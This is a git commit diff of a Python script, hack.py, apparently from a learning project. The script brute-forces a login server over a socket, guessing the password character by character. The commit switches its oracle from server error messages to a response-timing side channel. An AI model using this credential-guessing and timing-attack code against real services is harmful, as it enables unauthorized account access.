c49017d4e60c09036091f3a8d0ff5587a930625b
João Righetto <jm_zr@hotmail.com>
2022-12-15 14:03:57 +0000

    Finish project

--- hack.py
+++ hack.py
@@ -2,11 +2,12 @@ import json
 import socket
 import string
 import sys
+import time
 from typing import TextIO
 from _socket import SocketType
 
 
-def brute_force(logins_file: TextIO, socket_obj: SocketType) -> dict:
+def brute_force(logins_file: TextIO, socket_obj: SocketType):
     # Find the first login that exists on the server
     credentials = find_login(logins_file, socket_obj)
     success = False
@@ -16,28 +17,23 @@ def brute_force(logins_file: TextIO, socket_obj: SocketType) -> dict:
         # Try all possible letters and digits
         for char in list(string.ascii_letters + string.digits):
             # Add the current character to the end of the password
-            temp_pw = credentials["password"]
+            temp_pw = str(credentials["password"])
             temp_pw += char
             credentials_json = json.dumps({"login": credentials["login"], "password": temp_pw})
             # Send a login request to the server using the updated password
+            start = time.perf_counter()
             socket_obj.send(credentials_json.encode())
             response = socket_obj.recv(1024).decode()
-            # If the exception occurs, save current iteration and continue to next character of the password
-            if response == '{"result": "Exception happened during login"}':
+            if response == '{"result": "Connection success!"}':
                 credentials["password"] = temp_pw
-                break
-            # If the login is successful, return the login credentials
-            elif response == '{"result": "Connection success!"}':
-                credentials["password"] = temp_pw
-                success = True
-                break
-            # If the response is something else, continue trying different combinations
-            else:
-                continue
-    return credentials
+                return credentials
+            end = time.perf_counter()
+            time_taken = (end - start) * 10**5
+            if time_taken >= 10000:
+                credentials["password"] += char
 
 
-def find_login(logins_file: TextIO, socket_obj: SocketType) -> dict:
+def find_login(logins_file: TextIO, socket_obj: SocketType):
     credentials = {"login": "", "password": ""}
     for login in logins_file:
         credentials["login"] = login.strip()
